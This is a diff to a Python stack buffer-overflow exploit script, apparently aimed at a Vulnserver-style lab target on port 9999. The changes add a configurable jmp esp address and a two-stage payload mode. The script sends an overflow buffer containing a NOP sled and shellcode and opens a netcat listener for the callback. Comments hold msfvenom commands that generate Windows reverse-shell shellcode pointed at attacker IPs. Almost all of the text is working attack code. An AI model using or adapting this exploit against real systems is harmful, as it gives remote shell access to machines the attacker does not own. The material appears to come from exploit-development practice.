@@ -13,10 +13,10 @@ def get_args():
     parser.add_argument('-p','--port',dest = 'port', help = 'Enter target port. Default set to 9999')
     parser.add_argument('-c','--cmd',dest = 'cmd', help = 'Enter the name of server command being exploited. Default set to: \'TRUN /.:/\'')
     parser.add_argument('-o','--offset', dest = 'offset', help='Perform a manual search for EIP after BOF. Use pattern-offset meatsploit tool to find this offset. Default set to 2003' )
-    parser.add_argument('-lp','--local port',dest = 'lp', help = 'Enter call back port of attacker machine. Default set to port 1337. Netcat listener start automatically in a new gnome terminal. $~apt install gnome-terminal')
+    parser.add_argument('-lp','--local-port',dest = 'lp', help = 'Enter call back port of attacker machine. Default set to port 1337. Netcat listener start automatically in a new gnome terminal. $~apt install gnome-terminal')
+    parser.add_argument('-j','--jmpesp',dest = 'jmpesp',help = 'Enter sequence hex characters for jmp esp. Do not format sequence into little endian, format: 0xXXXXXX')
     parser.set_defaults(cmd = 'TRUN /.:/')
     parser.set_defaults(port = 9999)
-    parser.set_defaults(offset = 2003)
     parser.set_defaults(lp = 1337)
     options = parser.parse_args()
     return options
@@ -33,6 +33,28 @@ def buf():
 def start_nc():
     command = 'nc -lvnp {}'.format(opt.lp)
     return os.system("gnome-terminal -e 'bash -c \""+command+";bash\"'")
+
+def cmdSetup():
+    cmd1 = input('Enter argument for payload. Leave blank if not needed: ')
+    cmd1 = bytes(cmd1,'utf-8')
+    return cmd1
+
+def getPayloadType():
+    inputChecker = False
+    while inputChecker == False:
+        setCmd = input('Stage commands to target? (y/n): ')
+        setCmd = setCmd.strip()
+        if setCmd == 'y':
+            inputChecker = True
+        elif setCmd == 'n':
+            inputChecker = True
+            
+    return setCmd
+
+def getJmpEsp():
+    je = opt.jmpesp
+    je = int(je,16)
+    return p32(je)
 
 
 #######################################################################COLOR####################################################################################  
@@ -56,32 +78,68 @@ class fc:
 
 
 opt = get_args()
-overflow = opt.cmd + 'A' * opt.offset
-overflow = overflow.encode()
+opt.offset = int(opt.offset)
+gpl = getPayloadType()
+overflow = opt.cmd + 'A' * opt.offset #for unstaged
+overflow = overflow.encode() #for unstaged
+enterSim = b'\r\n'
 padding   = b'\x90' * 32 
-jmpesp = p32(0x625011af)
+jmpesp = getJmpEsp()
 timeout = 5 # s.connect timeout
 buf = buf()
-buffer = overflow + jmpesp + padding + buf
 
 
 ###################################################################RUN###########################################################################################
-#msfvenom -p windows/shell_reverse_tcp LHOST="192.168.241.133" LPORT=1337 EXITFUNC=thread -a x86 -b "\\x00" -f py > buf.py
+#msfvenom -p windows/shell_reverse_tcp LHOST="192.168.241.133" LPORT=1337 EXITFUNC=thread -a x86 -b "\\x00" -f py > buf.py // 0x625011af
+#msfvenom -p windows/shell_reverse_tcp LHOST="10.9.4.116" LPORT=1337 EXITFUNC=thread -a x86 -b "\\x00" -f py > buf.py //0x625014df 
 
 
 try:
-    print(f'{fc.pink_violet}[+]{fc.end} {fc.b}Exploiting target at {fc.end}{fc.g}{opt.ip}{fc.end} {fc.b}port {fc.g}{opt.port}{fc.end}')
-    print('\n')
-    print(f'{fc.pink_violet}[+]{fc.end} {fc.b}Starting netcat listener on port {fc.end}{fc.g}{opt.lp}{fc.end}')
-    start_nc()
-    print(f'{fc.pink_violet}[+]{fc.end} {fc.end}{fc.b}Connecting to target...{fc.end}')
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect((str(opt.ip), opt.port))
-    print(f'{fc.pink_violet}[+]{fc.end} {fc.b}Connected to target.{fc.end}')
-    print(f'{fc.pink_violet}[+]{fc.end} {fc.r}Sending payload: {str(len(buffer))} bytes.{fc.end}')
-    s.send(buffer)
-    print(f'{fc.pink_violet}[+]{fc.end} {fc.r}Payload sent.{fc.end}')
-    s.close()
+
+
+    if gpl == 'y':
+        cmd1 = cmdSetup()
+        stageCmd2PL = b'A' * opt.offset + jmpesp  + padding + buf
+        print(f'{fc.pink_violet}[+]{fc.end} {fc.b}Exploiting target at {fc.end}{fc.g}{opt.ip}{fc.end} {fc.b}port {fc.g}{opt.port}{fc.end}, {fc.b}timeout set to{fc.end} {fc.purple}{timeout}{fc.end}.')
+        print('\n')
+        print(f'{fc.pink_violet}[+]{fc.end} {fc.b}Starting netcat listener on port {fc.end}{fc.g}{opt.lp}{fc.end}')
+        start_nc()
+        print(f'{fc.pink_violet}[+]{fc.end} {fc.end}{fc.b}Connecting to target...{fc.end}')
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.connect((str(opt.ip), opt.port))
+        s.recv(1024)
+        s.recv(1024)
+        print(f'{fc.pink_violet}[+]{fc.end} {fc.b}Connected to target.{fc.end}')
+        print(f'{fc.pink_violet}[+]{fc.end} {fc.r}Sending stage 1:{fc.end} {fc.pink}{cmd1}{fc.end}')
+        s.send(cmd1+enterSim)
+        s.recv(1024)
+        print(f'{fc.pink_violet}[+]{fc.end} {fc.r}Stage 1 sent.{fc.end}')
+        print(f'{fc.pink_violet}[+]{fc.end} {fc.r}Sending stage 2: {str(len(stageCmd2PL)+len(enterSim))} bytes{fc.end}')
+        s.send(stageCmd2PL+enterSim)
+        s.recv(1024)
+        print(f'{fc.pink_violet}[+]{fc.end} {fc.r}Stage 2 sent{fc.end}')
+        s.close()
+    
+    
+    elif gpl == 'n':
+        print(jmpesp)
+        buffer = overflow + jmpesp + padding + buf
+        print(f'{fc.pink_violet}[+]{fc.end} {fc.b}Exploiting target at {fc.end}{fc.g}{opt.ip}{fc.end} {fc.b}port {fc.g}{opt.port}{fc.end}, {fc.b}timeout set to{fc.end} {fc.purple}{timeout}{fc.end}.')
+        print('\n')
+        print(f'{fc.pink_violet}[+]{fc.end} {fc.b}Starting netcat listener on port {fc.end}{fc.g}{opt.lp}{fc.end}')
+        start_nc()
+        print(f'{fc.pink_violet}[+]{fc.end} {fc.end}{fc.b}Connecting to target...{fc.end}')
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.connect((str(opt.ip), opt.port))
+        print(f'{fc.pink_violet}[+]{fc.end} {fc.b}Connected to target.{fc.end}')
+        print(f'{fc.pink_violet}[+]{fc.end} {fc.r}Sending payload: {str(len(buffer))} bytes.{fc.end}')
+        s.send(buffer)
+        print(f'{fc.pink_violet}[+]{fc.end} {fc.r}Payload sent.{fc.end}')
+        s.close()
+
+
 except Exception as e:
         print(f'\tError: {fc.rw}{e}{fc.end}')
         sys.exit()
